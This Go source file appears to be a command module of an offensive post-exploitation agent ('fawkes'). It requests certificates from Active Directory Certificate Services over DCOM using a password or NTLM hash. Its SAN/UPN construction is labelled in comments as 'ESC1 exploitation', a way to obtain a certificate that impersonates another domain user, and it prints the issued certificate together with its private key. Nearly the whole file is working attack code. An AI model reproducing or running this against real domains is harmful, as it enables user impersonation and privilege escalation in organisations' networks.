// adcs_request.go implements certificate request operations: CSR generation,
// submission, and output formatting. DCOM connectivity is in adcs_request_dcom.go.

package commands

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/pem"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
)

// adcsRequestArgs extends the base adcs args for the request action
type adcsRequestArgs struct {
	Server   string `json:"server"`
	Username string `json:"username"`
	Password string `json:"password"`
	Hash     string `json:"hash"`
	Domain   string `json:"domain"`
	CAName   string `json:"ca_name"`
	Template string `json:"template"`
	Subject  string `json:"subject"`
	AltName  string `json:"alt_name"`
	Timeout  int    `json:"timeout"`
}

// CR_DISP constants from MS-WCCE
const (
	crDispIssued          = 0x00000003
	crDispUnderSubmission = 0x00000005
	crDispDenied          = 0x00000002
	crDispIssuedOutOfBand = 0x00000006
	crFlagRenewal         = 0x00000004
)

// CR_IN_PKCS10 flag — the request is a PKCS#10 CSR
const crInPKCS10 = 0x00000100

// OID for Subject Alternative Name extension
var oidSubjectAltName = asn1.ObjectIdentifier{2, 5, 29, 17}

// adcsRequest handles the "request" action for the adcs command.
// It generates a PKCS#10 CSR, submits it to a CA via DCOM (ICertRequestD),
// and returns the issued certificate.
func adcsRequest(args adcsRequestArgs) structs.CommandResult {
	if args.CAName == "" {
		return errorResult("Error: ca_name required (e.g., 'CA-NAME' from 'adcs -action cas')")
	}
	if args.Template == "" {
		return errorResult("Error: template required (e.g., 'User', 'Machine', or a vulnerable template name)")
	}
	if args.Username == "" || (args.Password == "" && args.Hash == "") {
		return errorResult("Error: username and password (or hash) required for DCOM authentication")
	}
	if args.Timeout <= 0 {
		args.Timeout = 30
	}

	// Parse domain from username if not specified
	if args.Domain == "" {
		args.Domain, args.Username = parseDomainUser(args.Username)
	}

	// Default subject to current user if not specified
	if args.Subject == "" {
		args.Subject = fmt.Sprintf("CN=%s", args.Username)
	}

	// Generate RSA key pair
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return errorf("Error generating RSA key: %v", err)
	}

	// Build CSR
	csrDER, err := adcsBuildCSR(key, args.Subject, args.AltName)
	if err != nil {
		return errorf("Error building CSR: %v", err)
	}

	// Build NTLM credential
	cred, credErr := rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
	zeroCredentials(&args.Password, &args.Hash)
	if credErr != nil {
		return errorf("Error: %v", credErr)
	}

	ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background()),
		time.Duration(args.Timeout)*time.Second)
	defer cancel()

	// Submit CSR via DCOM
	resp, err := adcsSubmitCSR(ctx, args.Server, args.CAName, args.Template, args.AltName, csrDER, cred)
	if err != nil {
		return errorf("Error submitting certificate request: %v", err)
	}

	// Build output
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("CA: %s | Template: %s\n", args.CAName, args.Template))
	sb.WriteString(fmt.Sprintf("Request ID: %d\n", resp.RequestID))
	sb.WriteString(fmt.Sprintf("Disposition: %s (0x%08x)\n", adcsDispositionString(resp.Disposition), resp.Disposition))

	if resp.DispositionMessage != nil && len(resp.DispositionMessage.Buffer) > 0 {
		msg := adcsDecodeUTF16(resp.DispositionMessage.Buffer)
		if msg != "" {
			sb.WriteString(fmt.Sprintf("Message: %s\n", msg))
		}
	}

	switch resp.Disposition {
	case crDispIssued, crDispIssuedOutOfBand:
		// Certificate was issued
		if resp.EncodedCert != nil && len(resp.EncodedCert.Buffer) > 0 {
			certPEM := pem.EncodeToMemory(&pem.Block{
				Type:  "CERTIFICATE",
				Bytes: resp.EncodedCert.Buffer,
			})
			keyDER := x509.MarshalPKCS1PrivateKey(key)
			keyPEM := pem.EncodeToMemory(&pem.Block{
				Type:  "RSA PRIVATE KEY",
				Bytes: keyDER,
			})
			structs.ZeroBytes(keyDER)

			sb.WriteString("\n--- ISSUED CERTIFICATE ---\n")
			sb.Write(certPEM)
			sb.WriteString("\n--- PRIVATE KEY ---\n")
			sb.Write(keyPEM)
			structs.ZeroBytes(keyPEM)

			// Parse cert for summary
			if cert, err := x509.ParseCertificate(resp.EncodedCert.Buffer); err == nil {
				sb.WriteString(fmt.Sprintf("\nSubject: %s\n", cert.Subject))
				sb.WriteString(fmt.Sprintf("Issuer: %s\n", cert.Issuer))
				sb.WriteString(fmt.Sprintf("Serial: %s\n", cert.SerialNumber))
				sb.WriteString(fmt.Sprintf("Valid: %s → %s\n",
					cert.NotBefore.Format("2006-01-02 15:04:05"),
					cert.NotAfter.Format("2006-01-02 15:04:05")))
				if len(cert.DNSNames) > 0 {
					sb.WriteString(fmt.Sprintf("SANs (DNS): %s\n", strings.Join(cert.DNSNames, ", ")))
				}
				if len(cert.EmailAddresses) > 0 {
					sb.WriteString(fmt.Sprintf("SANs (Email): %s\n", strings.Join(cert.EmailAddresses, ", ")))
				}
				for _, ip := range cert.IPAddresses {
					sb.WriteString(fmt.Sprintf("SANs (IP): %s\n", ip))
				}
			}
		}
	case crDispUnderSubmission:
		sb.WriteString("\nCertificate request is PENDING manager approval.\n")
		sb.WriteString(fmt.Sprintf("Use request ID %d to retrieve it later.\n", resp.RequestID))
	default:
		sb.WriteString("\nCertificate request was DENIED or failed.\n")
	}

	status := "success"
	if resp.Disposition != crDispIssued && resp.Disposition != crDispIssuedOutOfBand && resp.Disposition != crDispUnderSubmission {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

// adcsBuildCSR creates a PKCS#10 certificate signing request.
func adcsBuildCSR(key *rsa.PrivateKey, subject, altName string) ([]byte, error) {
	subj, err := adcsParseSubject(subject)
	if err != nil {
		return nil, fmt.Errorf("invalid subject: %w", err)
	}

	template := &x509.CertificateRequest{
		Subject:            subj,
		SignatureAlgorithm: x509.SHA256WithRSA,
	}

	// Add Subject Alternative Name if specified (ESC1 exploitation)
	if altName != "" {
		sanExt, err := adcsBuildSANExtension(altName)
		if err != nil {
			return nil, fmt.Errorf("building SAN extension: %w", err)
		}
		template.ExtraExtensions = append(template.ExtraExtensions, sanExt)
	}

	return x509.CreateCertificateRequest(rand.Reader, template, key)
}

// adcsParseSubject parses a subject string like "CN=user,O=org" into pkix.Name.
func adcsParseSubject(s string) (pkix.Name, error) {
	name := pkix.Name{}
	for _, part := range strings.Split(s, ",") {
		part = strings.TrimSpace(part)
		kv := strings.SplitN(part, "=", 2)
		if len(kv) != 2 {
			continue
		}
		key := strings.ToUpper(strings.TrimSpace(kv[0]))
		val := strings.TrimSpace(kv[1])
		switch key {
		case "CN":
			name.CommonName = val
		case "O":
			name.Organization = []string{val}
		case "OU":
			name.OrganizationalUnit = []string{val}
		case "L":
			name.Locality = []string{val}
		case "ST", "S":
			name.Province = []string{val}
		case "C":
			name.Country = []string{val}
		default:
			return name, fmt.Errorf("unknown subject component: %s", key)
		}
	}
	return name, nil
}

// adcsBuildSANExtension builds a Subject Alternative Name extension.
// Supports UPN (user@domain) format for ESC1 exploitation.
func adcsBuildSANExtension(altName string) (pkix.Extension, error) {
	// ASN.1 GeneralName tags
	const (
		tagOtherName = 0 // [0] IMPLICIT OtherName
		tagDNS       = 2 // [2] IMPLICIT IA5String
	)

	// OID for UPN (User Principal Name): 1.3.6.1.4.1.311.20.2.3
	oidUPN := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 20, 2, 3}

	var rawValues []asn1.RawValue

	// If altName contains @, treat as UPN
	if strings.Contains(altName, "@") {
		// UPN is encoded as OtherName with:
		// SEQUENCE { OID(upn), [0] EXPLICIT UTF8String(value) }
		upnUTF8, err := asn1.Marshal(asn1.RawValue{
			Tag:   asn1.TagUTF8String,
			Class: asn1.ClassUniversal,
			Bytes: []byte(altName),
		})
		if err != nil {
			return pkix.Extension{}, err
		}

		// Wrap in explicit [0] tag
		explicitUPN, err := asn1.Marshal(asn1.RawValue{
			Tag:        0,
			Class:      asn1.ClassContextSpecific,
			IsCompound: true,
			Bytes:      upnUTF8,
		})
		if err != nil {
			return pkix.Extension{}, err
		}

		// Build OtherName SEQUENCE
		oidBytes, err := asn1.Marshal(oidUPN)
		if err != nil {
			return pkix.Extension{}, err
		}

		otherNameContent := append(oidBytes, explicitUPN...)

		rawValues = append(rawValues, asn1.RawValue{
			Tag:        tagOtherName,
			Class:      asn1.ClassContextSpecific,
			IsCompound: true,
			Bytes:      otherNameContent,
		})
	} else {
		// Treat as DNS name
		rawValues = append(rawValues, asn1.RawValue{
			Tag:   tagDNS,
			Class: asn1.ClassContextSpecific,
			Bytes: []byte(altName),
		})
	}

	sanBytes, err := asn1.Marshal(rawValues)
	if err != nil {
		return pkix.Extension{}, err
	}

	return pkix.Extension{
		Id:       oidSubjectAltName,
		Critical: false,
		Value:    sanBytes,
	}, nil
}

func adcsDispositionString(d uint32) string {
	switch d {
	case crDispIssued:
		return "ISSUED"
	case crDispUnderSubmission:
		return "PENDING"
	case crDispDenied:
		return "DENIED"
	case crDispIssuedOutOfBand:
		return "ISSUED_OUT_OF_BAND"
	default:
		return "ERROR"
	}
}

// adcsDecodeUTF16 decodes a UTF-16LE byte slice to a Go string.
func adcsDecodeUTF16(b []byte) string {
	if len(b) < 2 {
		return ""
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = uint16(b[i*2]) | uint16(b[i*2+1])<<8
	}
	// Remove null terminator
	for len(u16) > 0 && u16[len(u16)-1] == 0 {
		u16 = u16[:len(u16)-1]
	}
	runes := make([]rune, len(u16))
	for i, v := range u16 {
		runes[i] = rune(v)
	}
	return string(runes)
}
